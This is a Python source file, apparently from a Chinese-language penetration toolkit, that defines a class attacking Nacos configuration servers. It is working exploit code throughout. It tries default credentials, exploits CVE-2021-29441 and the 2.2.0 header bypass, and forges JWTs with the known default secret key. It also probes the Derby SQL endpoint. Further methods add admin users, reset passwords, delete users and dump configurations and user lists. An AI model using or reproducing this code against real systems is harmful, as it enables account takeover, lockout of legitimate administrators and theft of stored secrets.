from urllib.parse import urljoin
import requests
import jwt
import datetime
import base64
import toolss
import toolss.utils
import json
import subprocess


class nacos:
    def __init__(self, target, proxy) -> None:
        self.target = target
        self.proxy = proxy
        self.verify = False
        self.timeout = 10
        self.allow_redirects = False
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def get_nacos_version(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/console/server/state"
            else:
                path = "/nacos/v1/console/server/state"

            url = f"{self.target}{path}"
            
            req = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if req.status_code == 200 :
                json_data = json.loads(req.text)
                data = dict(json_data)
                return f"[*] Nacos Version:{data["version"]}"
            else:
                return "[-] 获取Nacos Version失败!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}", ""
    
    def default_user(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users/login"
            else:
                path = "/nacos/v1/auth/users/login"

            url = f"{self.target}{path}"
            
            data = {
                "username": "nacos",
                "password": "nacos"
            }
            req = requests.post(url=url, data=data, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if req.status_code == 200 :
                return f"[+] Nacos存在默认口令:(nacos,nacos)!"
            else:
                return "[-] Nacos不存在默认口令!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"    

    def nacos_unauthorized(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
            else:
                path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"

            url = f"{self.target}{path}"
            req = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if req.status_code == 200 and "username" in req.text :
                return f"[+] 存在Nacos未授权访问漏洞,你可访问 {url} 查看详细信息！"
            else:
                return f"[-] {url} 不存在Nacos未授权访问!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
        
    
    def nacos_29441_unauthorized(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
            else:
                path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"

            url = f"{self.target}{path}"
               
            self.headers["User-Agent"] = "Nacos-Server"
            res = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if res.status_code == 200  and "username" in res.text :
                return f"[+] 存在Nacos未授权访问漏洞[CVE-2021-29441], 可尝试添加用户!)"
            else:
                return "[-] 不存在Nacos未授权访问[CVE-2021-29441]!"
            
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
        
    
    def nacos_220_unauthorized(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken"
            else:
                path = "/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken"
            url = f"{self.target}{path}"
            self.headers["serverIdentity"] = "security"
            req = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if req.status_code == 200 and "username" in req.text :
                return "[+] 存在Nacos2.2.0权限绕过未授权访问漏洞,Header中添加:(serverIdentity: security)可尝试添加用户!"
            else:
                return "[-] 不存在Nacos2.2.0权限绕过未授权访问漏洞!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}!"
        

    def nacos_sql(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = f"nacos/v1/cs/ops/derby?sql=select%20*%20from%20config_info"
            else:
                path = f"/nacos/v1/cs/ops/derby?sql=select%20*%20from%20config_info"
            url = f"{self.target}{path}"
            req = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if req.status_code == 200 and 'code":200' in req.text:
                return f"[+] {self.target} Nacos存在sql注入漏洞!"
            elif req.status_code == 403:
                self.headers["User-Agent"] = "Nacos-Server"
                res = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
                if res.status_code == 200 and 'code":200' in res.text:
                    return "[+] Nacos存在sql注入漏洞!"
                else:
                    return "[-] Nacos不存在sql注入漏洞!"
            else:
                return "[-] Nacos不存在sql注入漏洞!"
        except requests.exceptions.RequestException as e:
            return "[!] 发生错误了:{str(e)}"         

    def nacos_add_user(self,username, password):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users"
            else:
                path = "/nacos/v1/auth/users"
            
            data = {
                "username": username,
                "password": password
            }
            url = f"{self.target}{path}"
            req = requests.post(url=url, data=data, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if "create user ok" in req.text and req.status_code == 200 :
                return f"[+] Nacos权限绕过任意用户添加: (user:{data["username"]},pass={data["password"]})成功!\n[+] {req.text}"
            else:
                return "[-] Nacos权限绕过任意用户添加失败!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}" 
    
    def nacos_add_user_220(self,username, password):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users"
            else:
                path = "/nacos/v1/auth/users"
            
            data = {
                "username": username,
                "password": password
            }
            url = f"{self.target}{path}"
            self.headers["serverIdentity"] = "security"
            req = requests.post(url=url, data=data, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if "create user ok" in req.text and req.status_code == 200 :
                return f"[+] Nacos2.2.0权限绕过任意用户添加: (user:{data["username"]},pass={data["password"]})成功!\n[+] {req.text}"
            else:
                return "[-] Nacos2.2.0权限绕过任意用户添加失败!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}" 
        
    def nacos_add_user_29441(self,username, password):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users"
            else:
                path = "/nacos/v1/auth/users"
        
            data = {
                "username": username,
                "password": password
            }
            url = f"{self.target}{path}"           
            self.headers["User-Agent"] = "Nacos-Server"
            res = requests.post(url=url, data=data, headers=self.headers, timeout=self.timeout, verify=self.verify, proxies=self.proxy)
            if "create user ok" in res.text and res.status_code == 200 :
                return f"[+] Nacos任意用户添加[CVE-2021-29441]: (user:{data["username"]},pass={data["password"]})成功!\n[+] {res.text}"
            else:
                return "[-] Nacos[CVE-2021-29441]任意用户添加失败!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
            

    def get_jwt_token(self):
        dur_time = datetime.datetime.now() + datetime.timedelta(days=1) # 创建一个时间间隔，表示1天的时间间隔
        timestamp = int(dur_time.timestamp()) 
        print(timestamp)
        headers = {'alg': 'HS256', 'typ': 'JWT'}
        #"exp": int(time.time()) + 86400
        payload = {"sub": "nacos123","exp": timestamp}      
        key = "SecretKey012345678901234567890123456789012345678901234567890123456789"        
        skey =  base64.b64encode(key.encode()).decode()
        
        token = jwt.encode(payload=payload, key=skey, algorithm='HS256', headers=headers)
        # s = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvczEyMyIsImV4cCI6MTcxNjYyMzAzNn0.R6tVdcnbQE9VQllcMpnANEBHmBsTTiWlDylY7tbEfM4"
        # decode_token = jwt.decode(s, key, algorithms=['HS256'])
        # print(decode_token)
        
        return token

    def get_nacos_token(self):
        jar_file = toolss.utils.current_directory() + "\\file\\jwt_keypoc.jar"
        # print(jar_file)
        # 调取jar文件生成jwt令牌
        process = subprocess.Popen(["java", "-jar", jar_file], stdout=subprocess.PIPE) 
        # 从stdout中读取生成的值
        output, error = process.communicate()
        token = output.decode().strip()
        return token


    def nacos_jwt_bypass(self):
        try:
            requests.packages.urllib3.disable_warnings()
            # token = self.get_jwt_token()
            # print(token)
            token = self.get_nacos_token()
            # print(token)
            
            ua = {
                'User-Agent': "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                'Content-Type': "application/x-www-form-urlencoded",
                # 'Authorization': "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxNjU1OTk0NX0.BUa6CJZ3Uqbaggm42-1NGrDZyETFxn4wq2GMDe1JmFQ"
                'Authorization': f"Bearer {token}"
                # 'Authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvczEyMyIsImV4cCI6MTcxNjYyMzAzNn0.R6tVdcnbQE9VQllcMpnANEBHmBsTTiWlDylY7tbEfM4"
            }
            

            if self.target.endswith("/"):
                path = "nacos/v1/auth/users/login"
            else:
                path = "/nacos/v1/auth/users/login"
            url = f"{self.target}{path}"
            # POST内容无关了，任意，但是不能缺少必要字段
            data = {
                "username": "test",
                "password": "test"
            }

            req = requests.post(url=url,headers=ua, data=data, timeout=self.timeout, verify=self.verify, allow_redirects=self.allow_redirects, proxies=self.proxy)
            
            if req.status_code == 200 and ('Authorization' in req.headers):
                return f"[+] 存在Nacos默认JWT身份认证绕过漏洞,也可尝试添加用户，删除用户，修改用户密码!" # {req.text}
            else:
                return f"[-] 不存在Nacos默认JWT身份认证绕过漏洞!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
    
    def nacos_jwt_bypass_one(self):
        try:
            requests.packages.urllib3.disable_warnings()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users"
            else:
                path = "/nacos/v1/auth/users"
            url = f"{self.target}{path}"

            payload = {"pageNo": "1", "pageSize": "9","accessToken": f"{self.get_jwt_token()}"}
            self.headers["Referer"] = self.target
            req = requests.get(url=url,headers=self.headers, params=payload, timeout=self.timeout, verify=self.verify, allow_redirects=self.allow_redirects, proxies=self.proxy)
            if req.status_code == 200 and ('password' in req.text):
                return "[+] 存在Nacos默认JWT身份认证登录绕过漏洞,也可尝试添加用户,修改已知用户密码!"
            else:
                return "[-] 不存在Nacos默认JWT身份认证登录绕过漏洞!"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"

    def nacos_add_user_jwt(self, username, password):
        try:
            requests.packages.urllib3.disable_warnings()
            token = self.get_nacos_token()
            if self.target.endswith("/"):
                path = f"nacos/v1/auth/users?accessToken={token}"
            else:
                path = f"/nacos/v1/auth/users?accessToken={token}"
            url = f"{self.target}{path}"

            data = {
                "username": username,
                "password": password
            }

            ua = {
                'User-Agent': "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                'Content-Type': "application/x-www-form-urlencoded",
                'Authorization': f"Bearer {token}"
            }

            req = requests.post(url=url, headers=ua, data=data, verify=self.verify, timeout=self.timeout)
            
            if "create user ok" in req.text:
                return f"[+] 存在默认秘钥，Nacos 添加用户:({username}/{password})成功!\n"
            else:
                return f"[-] 不存在默认秘钥，Nacos 添加用户失败!\n"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
        
    
    def nacos_jwt_bypass_adduser(self, username, password):
        try:
            requests.packages.urllib3.disable_warnings()
            # token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvczEyMyIsImV4cCI6MTcxNjQ1OTUxNH0.SZZrXsZxksfBZANIjBTMMOXrdCyss4n2QMX4a-L-5Pk"
            token = self.get_nacos_token()
            if self.target.endswith("/"):
                path = "nacos/v1/auth/users"
            else:
                path = "/nacos/v1/auth/users"
            
            ua = {
                'User-Agent': "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                'Content-Type': "application/x-www-form-urlencoded",
                'Authorization': f"Bearer {token}"                
            }

            url = f"{self.target}{path}"

            data = {
                "username": username,
                "password": password
            }

            req = requests.post(url=url, headers=ua, data=data, verify=self.verify, timeout=self.timeout)

            if "create user ok" in req.text:
                return f"[+] 存在默认秘钥，Nacos 添加用户:({username}/{password})成功!\n[+] {req.text}"
            else:
                return f"[-] 不存在默认秘钥，Nacos 添加用户失败!\n"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
        
    
    def nacos_jwt_bypass_user(self, username, password):
        try:
            requests.packages.urllib3.disable_warnings()
            token = self.get_nacos_token()
            
            if self.target.endswith("/"):
                path = f"nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken={token}"
            else:
                path = f"/nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken={token}"
            
            ua = {
                'User-Agent': "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                'Content-Type': "application/x-www-form-urlencoded",
                'Authorization': f"Bearer {token}"                
            }

            url = f"{self.target}{path}"

            data = {
                "username": username,
                "password": password
            }

            req = requests.post(url=url, headers=ua, data=data, verify=self.verify, timeout=self.timeout)

            if "create user ok" in req.text:
                return f"[+] 存在默认秘钥，Nacos 添加用户:({username}/{password})成功!\n[+] {req.text}"
            else:
                return f"[-] 不存在默认秘钥，Nacos 添加用户失败!\n"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"


    # http://192.168.80.131:8848/nacos/v1/auth/users?username=nacos&newPassword=123456&pageNo=1&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5MzA1OTQyMX0.rh3mpIO1GQ8liXkza9ZRoi2u21S1uhKVFioxAwkIrFk
    def nacos_userpass_reset(self,user, password):
        # 用户名是否存在的判断
        try:
            token = self.get_nacos_token()
            if self.target.endswith("/"):
                path = f"nacos/v1/auth/users?accessToken={token}&username={user}&newPassword={password}"
            else:
                path = f"/nacos/v1/auth/users?accessToken={token}&username={user}&newPassword={password}"
            url = f"{self.target}{path}"
            self.headers["accessToken"] = token
            res = requests.put(url=url, headers=self.headers, verify=self.verify)
            if res.status_code == 200 and "update user ok" in res.text:
                return f"[+] 存在nacos密码重置漏洞, 已更新{user}的密码为：{password}\n[+] {res.text}"
            else:
                return f"[-] 通过nacos默认秘钥重置密码失败，请检查是否存在默认秘钥绕过漏洞!"    
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}" 

    # nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 配置信息
    # /nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= 集群信息
    # DELETE /nacos/v1/auth/users?username=test111 删除用户 

    def put_nacos_password(self,username, password):
        try:
            token = self.get_nacos_token()
            if self.target.endswith("/"):
                path = f"nacos/v1/auth/users?accessToken={token}"
            else:
                path = f"/nacos/v1/auth/users?accessToken={token}"
            url = f"{self.target}{path}"
            data = {
                "username": username,
                "newPassword": password
            }
            self.headers["accessToken"] = token
            res = requests.put(url=url, headers=self.headers, verify=self.verify, data=data)
            if res.status_code == 200 and "update user ok" in res.text:
                return f"[+] 存在nacos默认秘钥, 已更新{username}的密码为：{password}\n[+] {res.text}"
            else:
                return f"[-] 通过nacos默认秘钥重置密码失败，请检查是否存在默认秘钥或者用户名不存在!"    
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}" 
        
    def delete_nacos_user(self,username):
        try:
            token = self.get_nacos_token()
            if self.target.endswith("/"):
                path = f"nacos/v1/auth/users"
            else:
                path = f"/nacos/v1/auth/users"
            url = f"{self.target}{path}"

            data = {"username": username}
            
            self.headers["Authorization"] = f"Bearer {token}" 
            res = requests.delete(url=url, headers=self.headers, verify=self.verify, data=data)
            if res.status_code == 200 and "delete user ok" in res.text:
                return f"[+] 存在nacos默认秘钥, 已删除用户{username}!\n[+] {res.text}"
            else:
                return f"[-] 通过nacos默认秘钥删除用户失败，请检查是否存在默认秘钥或者用户名不存在!\n[-] {res.text}"    
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
        
    
    def get_nacos_config(self):
        try:
            token = self.get_nacos_token()
            if self.target.endswith("/"):
                path = f"nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99"
            else:
                path = f"/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99"
            url = f"{self.target}{path}"
            
            self.headers["Authorization"] = f"Bearer {token}" 
            res = requests.get(url=url, headers=self.headers, verify=self.verify)
            if res.status_code == 200:
                return f"{res.text}"
            else:
                return f"[-] 通过nacos默认秘钥获取配置失败，请检查是否存在默认秘钥或者用户名不存在!\n[-] {res.text}"    
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"


    def get_nacos_user(self):
        try:
            token = self.get_nacos_token()
            rs = self.get_nacos_version()
            if "Version:" in rs:
                version = self.get_nacos_version().split(":")[1]
                
                if version.startswith("1."):
                    if self.target.endswith("/"):
                        path = f"nacos/v1/auth/users?pageNo=1&pageSize=99&accessToken={token}"
                    else:
                        path = f"/nacos/v1/auth/users?pageNo=1&pageSize=99&accessToken={token}"
                elif version.startswith("2."):
                    if self.target.endswith("/"):
                        path = f"nacos/v1/auth/users?search=&pageNo=1&pageSize=99&accessToken={token}"
                    else:
                        path = f"/nacos/v1/auth/users?search=&pageNo=1&pageSize=99&accessToken={token}"
                else:
                    return "[!] 获取Nacos版本错误!"
                url = f"{self.target}{path}" 
                self.headers["Authorization"] = f"Bearer {token}" 
                res = requests.get(url=url, headers=self.headers, verify=self.verify)
                if res.status_code == 200 :
                    return f"{res.text}"
                else:
                    return f"[-] 获取用户信息失败:\n[-] {res.text}" 
            else:
                 return "[!] 获取Nacos版本信息失败, 可尝试手动通过未授权查看用户信息！"  
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"  

    def check(self):
        result = []
        rs0 = self.get_nacos_version()
        result.append(rs0)
        rs1 = self.default_user()
        result.append(rs1)
        rs2 = self.nacos_unauthorized()
        result.append(rs2)
        rs9 = self.nacos_29441_unauthorized()
        result.append(rs9)
        rs3 = self.nacos_220_unauthorized()
        result.append(rs3)
        # rs4 = self.nacos_add_user()
        # result.append(rs4)
        # rs7 = self.nacos_add_user_29441()
        # result.append(rs7)
        # rs8 = self.nacos_add_user_220()
        # result.append(rs8)
        rs5 = self.nacos_jwt_bypass()
        result.append(rs5)
        rs6 = self.nacos_sql()
        result.append(rs6)

        return result

    